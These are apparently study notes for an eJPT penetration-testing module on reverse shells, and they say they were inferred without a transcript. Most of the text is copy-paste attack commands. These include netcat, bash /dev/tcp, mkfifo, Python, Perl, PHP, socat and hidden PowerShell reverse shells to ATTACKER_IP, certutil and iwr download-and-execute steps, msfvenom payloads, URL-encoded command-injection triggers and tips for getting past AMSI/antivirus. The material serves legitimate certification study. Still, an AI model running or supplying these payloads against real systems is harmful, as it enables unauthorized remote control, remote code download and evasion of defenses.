# 07 - Reverse Shells (eJPT) — Study Notes

Note: No transcript was provided. The notes below are inferred conservatively from the filename and module context (01-Bind&ReverseShells) and focus on standard eJPT techniques.

## What the video covers (Introduction / big picture)
- What a reverse shell is and why it’s preferred over a bind shell on modern networks.
  - Reverse shell: the target initiates an outbound TCP connection to your listener.
  - Advantages: works through NAT/firewalls that allow outbound traffic, less inbound ACL friction.
- Typical workflow:
  - Start a listener on the attacker box.
  - Trigger a reverse shell payload on the target (via RCE, command injection, webshell, file upload + exec, etc.).
  - Stabilize/upgrade the TTY for interactive use.
- Common payloads across OSes (Linux/Unix, Windows) and constraints (no -e support, restricted shells).
- Shell stabilization and quality (rlwrap, pty, socat).
- Operational considerations: choosing ports, egress filtering, avoiding bad characters, and using URL/base64 encoding when needed.

## Flow (ordered)
1. Identify your attacker IP/interface (e.g., VPN tun0) and choose an egress-friendly port (e.g., 4444, 443, 80).
2. Start a listener on the attacker (nc/rlwrap/pwncat/socat/MSF handler).
3. Craft an appropriate reverse shell payload for the target OS and available tools.
4. Deliver/trigger the payload (RCE, command injection, webshell, scheduled task, etc.).
5. Catch the connection; verify shell (whoami/hostname/ipconfig/ip a).
6. Stabilize/upgrade the shell (pty spawn, stty, socat).
7. Start basic post-exploitation enumeration.
8. If needed, pivot to more robust C2 (e.g., msf handler), or transfer utilities (nc/socat).

## Tools highlighted
- Netcat/ncat:
  - Listener and reverse connections; beware of -e support differences.
- rlwrap:
  - Line-editing and history for nc listeners.
- socat:
  - Full TTY reverse shells; best interactive quality.
- Python/Perl/PHP/Bash:
  - One-liner reverse shells leveraging built-in interpreters.
- PowerShell (Windows):
  - Native reverse TCP one-liners; encoded commands for evasion.
- Metasploit:
  - multi/handler for reverse shells; msfvenom for payloads (if allowed).
- File transfer helpers:
  - python3 -m http.server, certutil.exe, curl, wget.

## Typical command walkthrough (detailed, copy-paste friendly)

Replace ATTACKER_IP and LPORT with your values.

First, pick your interface IP:
- Linux/Kali: ip a | grep -A2 tun0
- Windows attacker: ipconfig

### 1) Start a listener (attacker)
Netcat basic:
```bash
nc -lvnp LPORT
```

Netcat with line-editing/history:
```bash
rlwrap -cAr nc -lvnp LPORT
```

pwncat (nice TTY and helpers):
```bash
pwncat-cs -lp LPORT
```

socat full TTY listener:
```bash
socat -d -d TCP-LISTEN:LPORT,reuseaddr,fork FILE:`tty`,raw,echo=0
```

Metasploit handler (if using MSF payloads):
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST ATTACKER_IP; set LPORT LPORT; exploit -j"
```

### 2) Linux/Unix reverse shell payloads (target)
Bash TCP (requires bash and /dev/tcp):
```bash
bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1
```

Bash via sh -c (useful inside injections):
```bash
sh -c 'bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1'
```

Netcat (with -e support, e.g., traditional nc or Ncat on Windows; not always available on Linux):
```bash
nc ATTACKER_IP LPORT -e /bin/sh
# or
nc -e /bin/bash ATTACKER_IP LPORT
```

Netcat (portable mkfifo trick; works when -e is not supported):
```bash
mkfifo /tmp/f; nc ATTACKER_IP LPORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

BusyBox nc (if available):
```bash
busybox nc ATTACKER_IP LPORT -e /bin/sh
```

Telnet fallback (when nc missing and /dev/tcp unavailable):
```bash
rm -f /tmp/p; mkfifo /tmp/p
telnet ATTACKER_IP LPORT 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
```

Python 3 reverse shell:
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

Perl reverse shell:
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

PHP one-liner:
```bash
php -r '$s=fsockopen("ATTACKER_IP",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Socat full TTY (best quality; requires socat on target):
```bash
socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:LPORT
```

### 3) Windows reverse shell payloads (target)
PowerShell TCP reverse shell:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII).GetBytes($sb2),0,$sb2.Length);$s.Flush()}$c.Close()"
```

PowerShell download-and-exec nc64.exe (if allowed), then connect:
```powershell
powershell -c "iwr -UseBasicParsing http://ATTACKER_IP/nc64.exe -OutFile nc64.exe"
.\nc64.exe -e cmd.exe ATTACKER_IP LPORT
```

certutil download (alternate):
```cmd
certutil -urlcache -f http://ATTACKER_IP/nc64.exe nc64.exe
nc64.exe -e cmd.exe ATTACKER_IP LPORT
```

Ncat on Windows (Nmap’s ncat usually supports -e):
```cmd
ncat.exe ATTACKER_IP LPORT -e cmd.exe
```

Metasploit payloads (if permitted):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f exe -o rev.exe
# Serve and execute rev.exe on target; handler as above.
```

### 4) Trigger via HTTP command injection/web RCE (examples)
URL-encoded bash reverse shell in a query parameter:
```text
http://target/vuln.php?cmd=bash+-c+'bash+-i+%3E%26+/dev/tcp/ATTACKER_IP/LPORT+0%3E%261'
```

Curl POST with command parameter:
```bash
curl -X POST http://target/vuln -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1'"
```

### 5) Shell stabilization/upgrade (Linux)
Quick PTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Full TTY upgrade steps (from a basic nc shell):
1) Background the shell: press Ctrl+Z
2) On attacker terminal:
```bash
stty raw -echo; fg
reset
export TERM=xterm
stty rows 50 cols 120
```

Best quality via socat (if you can run it on target):
- Attacker (listener):
```bash
socat -d -d TCP-LISTEN:LPORT,reuseaddr,fork FILE:`tty`,raw,echo=0
```
- Target (connect back):
```bash
socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:LPORT
```

### 6) Quick verification and hygiene
Inside the shell:
```bash
whoami; id; hostname; uname -a; ip a || ifconfig
pwd; ls -la
```

Network debugging (attacker):
```bash
sudo tcpdump -ni any tcp port LPORT
```

Simple web server for file transfer (attacker):
```bash
python3 -m http.server 8000
```
Linux target download:
```bash
curl -O http://ATTACKER_IP:8000/socat
wget http://ATTACKER_IP:8000/socat
```

Windows target download:
```cmd
certutil -urlcache -f http://ATTACKER_IP:8000/nc64.exe nc64.exe
```

## Practical tips
- Choose egress-friendly ports (443/80/53/123) if 4444 is blocked; avoid ephemeral ranges in use by the target.
- Confirm your correct LHOST (especially VPN tun0) before listening.
- If netcat lacks -e, use mkfifo method or Python/Perl/PHP alternatives.
- For web injections, URL-encode payloads or wrap them in sh -c '...'.
- Use rlwrap to improve basic nc shells; upgrade to PTY quickly for stability.
- If the shell drops, try a different port/protocol or alternate payload.
- On Windows, PowerShell is ubiquitous; use -NoP -NonI -W Hidden -Exec Bypass to reduce friction. If AMSI/AV interferes, use more benign tools (nc) or encode commands.
- Keep payloads short and reliable; test locally when possible.

## Minimal cheat sheet (one-screen flow)
Attacker listener:
```bash
rlwrap -cAr nc -lvnp 4444
```

Linux bash reverse:
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Linux nc (no -e) fallback:
```bash
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Linux python reverse:
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn("/bin/bash")'
```

Windows PowerShell reverse:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)}$c.Close()"
```

Windows ncat (if available):
```cmd
ncat.exe ATTACKER_IP 4444 -e cmd.exe
```

Upgrade TTY (Linux):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
# Ctrl+Z, then:
stty raw -echo; fg; reset; stty rows 50 cols 120
```

socat best TTY:
- Attacker:
```bash
socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
```
- Target:
```bash
socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

## Summary
- Reverse shells have the target connect back to you, making them far more reliable through NAT/firewalls than bind shells.
- Core steps: start a listener, trigger a suitable OS-specific reverse payload, catch and stabilize the shell, then proceed with enumeration.
- Know multiple payload variants (bash, nc without -e, Python, Perl, PHP, PowerShell) and when to use each.
- Improve shell quality with rlwrap/pty/socat and prepare for common obstacles (egress filtering, missing tools, quoting/bad characters).
- These techniques are staples in the eJPT; practice the full flow until you can deploy the right one-liner quickly and stabilize it.